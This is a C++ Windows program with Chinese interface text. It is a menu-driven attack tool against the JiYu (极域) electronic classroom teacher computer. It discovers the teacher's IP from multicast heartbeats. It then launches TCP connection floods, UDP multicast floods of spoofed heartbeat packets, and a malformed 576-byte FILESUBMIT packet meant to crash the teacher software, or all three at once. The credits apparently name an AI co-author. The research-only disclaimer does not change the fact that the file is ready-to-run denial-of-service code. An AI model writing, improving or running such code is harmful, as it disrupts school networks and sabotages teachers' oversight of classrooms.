// 在文件最顶部添加这三行
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#pragma comment(lib, "ws2_32.lib")

#include <iostream>
#include <cstring>
#include <string>
#include <thread>
#include <chrono>
#include <vector>
#include <atomic>
#include <winsock2.h>
#include <ws2tcpip.h>

#define TEACHER_MULTICAST_GROUP "224.50.50.42"
#define TEACHER_PORT            4988
#define TEACHER_CONTROL_PORT    4806
#define BUFFER_SIZE             4096

class JiYuAttacker {
private:
    std::string targetIP;
    std::atomic<bool> attacking{ false };
    std::vector<std::thread> attackThreads;
    std::atomic<uint64_t> packetsSent{ 0 };
    std::atomic<uint64_t> bytesSent{ 0 };
    std::atomic<uint64_t> connectFailures{ 0 };
    std::atomic<uint64_t> sendFailures{ 0 };

    // TCP SYN Flood攻击线程
    void tcpSynFloodThread(int threadId, int durationSeconds) {
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);

        auto startTime = std::chrono::steady_clock::now();
        uint64_t localPackets = 0;

        while (attacking) {
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
                std::chrono::steady_clock::now() - startTime).count();
            if (elapsed >= durationSeconds) break;

            SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (sock == INVALID_SOCKET) continue;

            u_long mode = 1;
            ioctlsocket(sock, FIONBIO, &mode);

            int reuse = 1;
            setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse, sizeof(reuse));

            sockaddr_in targetAddr;
            targetAddr.sin_family = AF_INET;
            targetAddr.sin_port = htons(TEACHER_CONTROL_PORT);
            targetAddr.sin_addr.s_addr = inet_addr(targetIP.c_str());

            // 非阻塞connect立即返回
            connect(sock, (sockaddr*)&targetAddr, sizeof(targetAddr));

            localPackets++;
            if (localPackets % 100 == 0) {
                packetsSent += 100;
            }

            closesocket(sock);
            std::this_thread::sleep_for(std::chrono::microseconds(10));
        }

        packetsSent += localPackets;
        WSACleanup();
    }

    // UDP组播洪水攻击线程
    void udpMulticastFloodThread(int threadId, int durationSeconds) {
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);

        SOCKET floodSock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (floodSock == INVALID_SOCKET) {
            WSACleanup();
            return;
        }

        int reuse = 1;
        setsockopt(floodSock, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse, sizeof(reuse));

        unsigned char fakePacket[44] = {
            0x4f, 0x4f, 0x4e, 0x43, 0x00, 0x00, 0x01, 0x00,
            0x10, 0x00, 0x00, 0x00, 0x19, 0x6d, 0x6a, 0xf9,
            0x29, 0x5b, 0xb9, 0x46, 0xab, 0x95, 0x8a, 0x14,
            0x3e, 0xcd, 0xdc, 0x26, 0xc0, 0xa8, 0x79, 0x01,
            0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
            0x8c, 0x02, 0x00, 0x00
        };

        sockaddr_in multicastAddr;
        multicastAddr.sin_family = AF_INET;
        multicastAddr.sin_port = htons(TEACHER_PORT);
        multicastAddr.sin_addr.s_addr = inet_addr(TEACHER_MULTICAST_GROUP);

        auto startTime = std::chrono::steady_clock::now();
        uint64_t localPackets = 0;

        while (attacking) {
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
                std::chrono::steady_clock::now() - startTime).count();
            if (elapsed >= durationSeconds) break;

            int sent = sendto(floodSock, (char*)fakePacket, sizeof(fakePacket), 0,
                (sockaddr*)&multicastAddr, sizeof(multicastAddr));

            if (sent > 0) {
                localPackets++;
                bytesSent += sent;
            }

            if (localPackets % 1000 == 0) {
                packetsSent += 1000;
                std::this_thread::sleep_for(std::chrono::milliseconds(1));
            }
        }

        packetsSent += localPackets;
        closesocket(floodSock);
        WSACleanup();
    }

    // ████████ 修复后的协议级崩溃攻击线程 ████████
    void protocolCrashThread(int threadId, int durationSeconds) {
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);

        auto startTime = std::chrono::steady_clock::now();
        uint64_t localPackets = 0;
        uint64_t localBytes = 0;

        while (attacking) {
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
                std::chrono::steady_clock::now() - startTime).count();
            if (elapsed >= durationSeconds) break;

            // ████ DEBUG: 显示线程启动信息 ████
            if (localPackets == 0) {
                std::cout << "\n[DEBUG-Thread-" << threadId << "] 线程启动，目标: "
                    << targetIP << ":" << TEACHER_CONTROL_PORT << std::endl;
            }

            SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (sock == INVALID_SOCKET) {
                connectFailures++;
                std::this_thread::sleep_for(std::chrono::milliseconds(100));
                continue;
            }

            // 设置超时
            DWORD timeout = 3000;
            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
            setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
            int reuse = 1;
            setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse, sizeof(reuse));

            sockaddr_in targetAddr;
            targetAddr.sin_family = AF_INET;
            targetAddr.sin_port = htons(TEACHER_CONTROL_PORT);
            targetAddr.sin_addr.s_addr = inet_addr(targetIP.c_str());

            // ████ 显示连接尝试 ████
            int connResult = connect(sock, (sockaddr*)&targetAddr, sizeof(targetAddr));
            if (connResult == SOCKET_ERROR) {
                int error = WSAGetLastError();
                if (localPackets % 10 == 0) { // 每10次显示一次错误，避免刷屏
                    std::cout << "\r[DEBUG] 连接失败 (Error " << error << "): "
                        << (error == WSAETIMEDOUT ? "超时" : "拒绝") << std::flush;
                }
                connectFailures++;
                closesocket(sock);
                std::this_thread::sleep_for(std::chrono::milliseconds(50));
                continue;
            }

            // ████ 连接成功，准备发送数据 ████
            std::cout << "\n[DEBUG-Thread-" << threadId << "] TCP连接成功！" << std::endl;

            // 构造576字节FILESUBMIT崩溃包（基于抓包Frame 17）
            unsigned char crashPacket[576] = {
                0x00, 0x00, 0x01, 0x00, 0x49, 0x46, 0x50, 0x55,
                0x34, 0x02, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x20, 0x00, 0x00, 0x00, 0xe7, 0x19, 0xd3, 0xaa,
                0x19, 0x81, 0xda, 0x01, 0x00, 0x00, 0x00, 0x00,
            };

            // Unicode "FILESUBMIT"
            const char fileSubmitUnicode[18] = {
                0x46,0x00,0x49,0x00,0x4c,0x00,0x45,0x00,
                0x53,0x00,0x55,0x00,0x42,0x00,0x4d,0x00,0x49,0x00
            };
            memcpy(crashPacket + 0x2C, fileSubmitUnicode, 18);

            // 填充超长文件名（0x66 'f'字符）
            for (int i = 0x3E; i < 0x240; i++) {
                crashPacket[i] = 0x66;
            }

            // ████ 发送并检查返回值 ████
            int sent = send(sock, (char*)crashPacket, sizeof(crashPacket), 0);
            if (sent == SOCKET_ERROR) {
                int error = WSAGetLastError();
                std::cout << "[DEBUG-Thread-" << threadId << "] 发送失败! Error: " << error << std::endl;
                sendFailures++;
            }
            else {
                std::cout << "[DEBUG-Thread-" << threadId << "] 成功发送 " << sent << " 字节崩溃包！" << std::endl;
                localPackets++;
                localBytes += sent;
            }

            // 发送WORB状态包
            char worbPacket[12] = { 0x00, 0x00, 0x01, 0x00, 0x57, 0x4f, 0x52, 0x42 };
            sent = send(sock, worbPacket, sizeof(worbPacket), 0);
            if (sent > 0) {
                localPackets++;
                localBytes += sent;
            }

            closesocket(sock);
            std::this_thread::sleep_for(std::chrono::milliseconds(20));
        }

        // 更新原子计数器
        packetsSent += localPackets;
        bytesSent += localBytes;
        WSACleanup();
    }

    // 混合攻击
    void mixedAttackThread(int durationSeconds) {
        std::thread t1(&JiYuAttacker::tcpSynFloodThread, this, 99, durationSeconds);
        std::thread t2(&JiYuAttacker::udpMulticastFloodThread, this, 98, durationSeconds);
        std::thread t3(&JiYuAttacker::protocolCrashThread, this, 97, durationSeconds);

        t1.detach();
        t2.detach();
        t3.detach();
    }

public:
    JiYuAttacker(const std::string& ip) : targetIP(ip) {}
    ~JiYuAttacker() { stopAttack(); }

    void startAttack(int attackType, int threads, int durationSeconds) {
        if (attacking) {
            std::cout << "[!] 攻击已在进行中！" << std::endl;
            return;
        }

        attacking = true;
        packetsSent = 0;
        bytesSent = 0;
        connectFailures = 0;
        sendFailures = 0;

        const char* attackName = (attackType == 1 ? "TCP SYN Flood" :
            attackType == 2 ? "UDP组播洪水" :
            attackType == 3 ? "协议级崩溃攻击" : "混合攻击");
        const char* desc = (attackType == 3 ? "基于抓包Frame 17的576字节FILESUBMIT畸形包" :
            attackType == 2 ? "基于抓包OONC心跳包(224.50.50.42:4988)" : "");

        std::cout << "\n[+] 启动攻击: " << attackName << std::endl;
        if (strlen(desc) > 0) std::cout << "[*] " << desc << std::endl;
        std::cout << "目标IP: " << targetIP << std::endl;
        std::cout << "线程数: " << threads << std::endl;
        std::cout << "持续时间: " << durationSeconds << "秒" << std::endl;
        std::cout << "\n[!] 按任意键停止攻击..." << std::endl;

        if (attackType == 4) {
            mixedAttackThread(durationSeconds);

            // 等待混合攻击完成
            std::this_thread::sleep_for(std::chrono::seconds(durationSeconds));
            attacking = false;
        }
        else {
            for (int i = 0; i < threads; i++) {
                if (attackType == 1) {
                    attackThreads.emplace_back(&JiYuAttacker::tcpSynFloodThread, this, i, durationSeconds);
                }
                else if (attackType == 2) {
                    attackThreads.emplace_back(&JiYuAttacker::udpMulticastFloodThread, this, i, durationSeconds);
                }
                else if (attackType == 3) {
                    attackThreads.emplace_back(&JiYuAttacker::protocolCrashThread, this, i, durationSeconds);
                }
            }

            // 详细统计线程
            std::thread statsThread([this, durationSeconds]() {
                auto start = std::chrono::steady_clock::now();
                while (attacking) {
                    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
                        std::chrono::steady_clock::now() - start).count();
                    if (elapsed >= durationSeconds) break;

                    std::cout << "\r[+] 发送: " << packetsSent << " 包, "
                        << bytesSent << " 字节 | 失败: 连接" << connectFailures
                        << "/发送" << sendFailures << " | 时间: " << elapsed << "/" << durationSeconds << "秒" << std::flush;
                    std::this_thread::sleep_for(std::chrono::seconds(1));
                }
                });
            statsThread.detach();

            // 等待完成
            std::thread waitThread([this, durationSeconds]() {
                auto start = std::chrono::steady_clock::now();
                while (attacking) {
                    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
                        std::chrono::steady_clock::now() - start).count();
                    if (elapsed >= durationSeconds) {
                        attacking = false;
                        break;
                    }
                    std::this_thread::sleep_for(std::chrono::milliseconds(100));
                }
                });

            waitThread.join();
        }

        stopAttack();
    }

    void stopAttack() {
        if (!attacking && attackThreads.empty()) return;

        std::cout << "\n[!] 正在停止攻击..." << std::endl;
        attacking = false;

        for (auto& t : attackThreads) {
            if (t.joinable()) t.join();
        }
        attackThreads.clear();

        std::cout << "[+] 攻击已停止" << std::endl;
        std::cout << "[*] 总计: " << packetsSent << " 包, " << bytesSent << " 字节" << std::endl;
        if (connectFailures > 0 || sendFailures > 0) {
            std::cout << "[*] 失败统计: 连接失败" << connectFailures
                << "次, 发送失败" << sendFailures << "次" << std::endl;
        }
    }

    void showMenu() {
        std::cout << "\n========== 极域电子教室测试工具 ==========" << std::endl;
        std::cout << "目标教师机: " << targetIP << std::endl;
        std::cout << "=========================================" << std::endl;
        std::cout << "[1] TCP SYN Flood (端口: " << TEACHER_CONTROL_PORT << ")" << std::endl;
        std::cout << "[2] UDP组播洪水 (组播: " << TEACHER_MULTICAST_GROUP << ":" << TEACHER_PORT << ")" << std::endl;
        std::cout << "[3] FILESUBMIT协议崩溃攻击" << std::endl;
        std::cout << "[4] 混合攻击 (全部同时)" << std::endl;
        std::cout << "[5] 重新发现教师机" << std::endl;
        std::cout << "[0] 退出程序" << std::endl;
        std::cout << "=========================================" << std::endl;
        std::cout << "请选择: ";
    }
};

class JiYuStudentClient {
private:
    SOCKET multicastSock;
    std::string teacherIP;

    void listLocalIPs() {
        char hostname[256];
        gethostname(hostname, sizeof(hostname));
        hostent* host = gethostbyname(hostname);

        std::cout << "[*] 本机网卡IP地址列表：" << std::endl;
        for (int i = 0; host->h_addr_list[i] != nullptr; i++) {
            in_addr addr;
            memcpy(&addr, host->h_addr_list[i], sizeof(in_addr));
            std::cout << "  - " << inet_ntoa(addr) << std::endl;
        }
    }

public:
    JiYuStudentClient() {
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
        multicastSock = INVALID_SOCKET;
    }

    ~JiYuStudentClient() {
        if (multicastSock != INVALID_SOCKET) closesocket(multicastSock);
        WSACleanup();
    }

    std::string discoverTeacherIP(int timeoutSeconds = 5) {
        std::cout << "=== 极域电子教室教师机发现工具 ===\nBy: Lxrui & KimiAI\n" << std::endl;
        listLocalIPs();

        std::cout << "\n[*] 正在监听组播地址 " << TEACHER_MULTICAST_GROUP
            << " 端口 " << TEACHER_PORT << " ..." << std::endl;

        multicastSock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (multicastSock == INVALID_SOCKET) {
            std::cerr << "[-] 创建套接字失败，错误码：" << WSAGetLastError() << std::endl;
            return "";
        }

        int reuse = 1;
        setsockopt(multicastSock, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse, sizeof(reuse));

        sockaddr_in localAddr;
        memset(&localAddr, 0, sizeof(localAddr));
        localAddr.sin_family = AF_INET;
        localAddr.sin_addr.s_addr = INADDR_ANY;
        localAddr.sin_port = htons(TEACHER_PORT);

        if (bind(multicastSock, (sockaddr*)&localAddr, sizeof(localAddr)) == SOCKET_ERROR) {
            std::cerr << "[-] 绑定端口失败，错误码：" << WSAGetLastError() << std::endl;
            return "";
        }

        ip_mreq mreq;
        mreq.imr_multiaddr.s_addr = inet_addr(TEACHER_MULTICAST_GROUP);
        mreq.imr_interface.s_addr = INADDR_ANY;

        if (setsockopt(multicastSock, IPPROTO_IP, IP_ADD_MEMBERSHIP,
            (char*)&mreq, sizeof(mreq)) == SOCKET_ERROR) {
            std::cerr << "[!] 加入组播组失败（可能需要管理员权限），错误码："
                << WSAGetLastError() << std::endl;
        }

        DWORD timeout = timeoutSeconds * 1000;
        setsockopt(multicastSock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));

        char buffer[BUFFER_SIZE];

        std::cout << "[*] 等待教师机广播消息..." << std::endl;

        sockaddr_in fromAddr;
        int fromLen = sizeof(fromAddr);
        int recvLen = recvfrom(multicastSock, buffer, BUFFER_SIZE - 1, 0,
            (sockaddr*)&fromAddr, &fromLen);

        if (recvLen > 0 && recvLen >= 44 && memcmp(buffer, "OONC", 4) == 0) {
            teacherIP = inet_ntoa(fromAddr.sin_addr);

            std::cout << "\n[+] 发现教师机！" << std::endl;
            std::cout << "====================================" << std::endl;
            std::cout << "教师机IP地址: " << teacherIP << std::endl;
            std::cout << "通信端口: " << ntohs(fromAddr.sin_port) << std::endl;
            std::cout << "数据包大小: " << recvLen << " 字节" << std::endl;
            std::cout << "====================================" << std::endl;

            return teacherIP;
        }

        std::cerr << "\n[-] 搜索超时，未在 " << timeoutSeconds << " 秒内发现教师机" << std::endl;
        return "";
    }
};

void showWarning() {
    std::cout << "=====================================================================" << std::endl;
    std::cout << "警告：本程序仅供网络安全研究和教育用途！" << std::endl;
    std::cout << "请务必在授权环境下测试，非法使用可能违反法律！" << std::endl;
    std::cout << "=====================================================================" << std::endl;
    std::cout << "\n按回车键继续..." << std::endl;
    std::cin.get();
}

int main() {
    showWarning();

    BOOL isAdmin = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD size = sizeof(elevation);
        if (GetTokenInformation(hToken, TokenElevation, &elevation, size, &size)) {
            isAdmin = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }

    if (!isAdmin) {
        std::cout << "\n[!] 警告：未以管理员权限运行，某些功能可能受限！" << std::endl;
        std::cout << "[!] 建议右键以管理员身份运行此程序" << std::endl;
        std::cout << "\n按回车键继续..." << std::endl;
        std::cin.get();
    }

    std::string teacherIP;
    JiYuStudentClient* client = nullptr;
    JiYuAttacker* attacker = nullptr;

    while (true) {
        if (client == nullptr) {
            client = new JiYuStudentClient();
            teacherIP = client->discoverTeacherIP(5);
            delete client;
            client = nullptr;
        }

        if (!teacherIP.empty() && attacker == nullptr) {
            attacker = new JiYuAttacker(teacherIP);
        }

        if (attacker != nullptr) {
            attacker->showMenu();

            int choice;
            std::cin >> choice;
            std::cin.ignore();

            switch (choice) {
            case 1:
            case 2:
            case 3: {
                std::cout << "\n[*] 攻击配置:" << std::endl;
                std::cout << "线程数(建议10-100): ";
                int threads;
                std::cin >> threads;
                std::cout << "持续时间(秒): ";
                int duration;
                std::cin >> duration;
                std::cin.ignore();

                attacker->startAttack(choice, threads, duration);
                break;
            }
            case 4: {
                std::cout << "\n[*] 混合攻击配置:" << std::endl;
                std::cout << "持续时间(秒): ";
                int duration;
                std::cin >> duration;
                std::cin.ignore();

                std::cout << "[+] 启动混合攻击模式..." << std::endl;
                attacker->startAttack(4, 0, duration);
                break;
            }
            case 5: {
                delete attacker;
                attacker = nullptr;
                std::cout << "\n[*] 重新发现教师机..." << std::endl;
                break;
            }
            case 0: {
                delete attacker;
                return 0;
            }
            default: {
                std::cout << "\n[-] 无效选项！" << std::endl;
                break;
            }
            }
        }
        else {
            std::cout << "\n[-] 未发现教师机，重试？(y/n): ";
            char retry;
            std::cin >> retry;
            if (retry != 'y' && retry != 'Y') {
                break;
            }
        }
    }

    if (attacker) delete attacker;
    std::cout << "\n[*] 程序已退出" << std::endl;
    return 0;
}